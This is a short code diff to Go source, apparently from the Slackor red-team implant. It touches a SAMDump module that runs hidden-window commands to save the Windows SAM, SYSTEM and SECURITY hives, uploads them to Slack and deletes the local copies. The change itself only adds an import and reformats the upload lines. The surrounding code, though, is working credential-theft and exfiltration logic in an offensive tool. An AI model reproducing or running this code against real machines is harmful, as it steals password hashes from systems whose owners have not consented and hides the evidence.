@@ -7,6 +7,7 @@ import (
 	"os/exec"
 	"syscall"
 
+	"github.com/Coalfire-Research/Slackor/internal/slack"
 	"github.com/Coalfire-Research/Slackor/pkg/command"
 )
 
@@ -37,9 +38,9 @@ func (s SAMDump) Run(clientID string, jobID string, args []string) (string, erro
 	cmd3.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
 	cmd3.Run()
 
-	slack.Upload(clientID, jobID+"-1", "sam_" + clientID)
-	slack.Upload(clientID, jobID+"-2", "sys_" + clientID)
-	slack.Upload(clientID, jobID+"-3", "security_" + clientID)
+	slack.Upload(clientID, jobID+"-1", "sam_"+clientID)
+	slack.Upload(clientID, jobID+"-2", "sys_"+clientID)
+	slack.Upload(clientID, jobID+"-3", "security_"+clientID)
 	os.Remove("sam_" + clientID)
 	os.Remove("sys_" + clientID)
 	os.Remove("security_" + clientID)
